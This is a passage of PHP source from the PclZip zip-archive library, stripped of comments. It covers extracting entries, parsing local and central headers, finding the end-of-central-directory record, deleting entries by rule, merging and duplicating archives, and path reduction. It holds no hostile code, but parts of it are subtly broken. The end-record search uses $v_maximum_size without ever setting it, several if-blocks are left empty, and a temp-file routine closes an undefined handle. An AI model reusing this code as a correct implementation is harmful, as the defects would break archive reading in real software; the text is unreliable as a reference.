      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
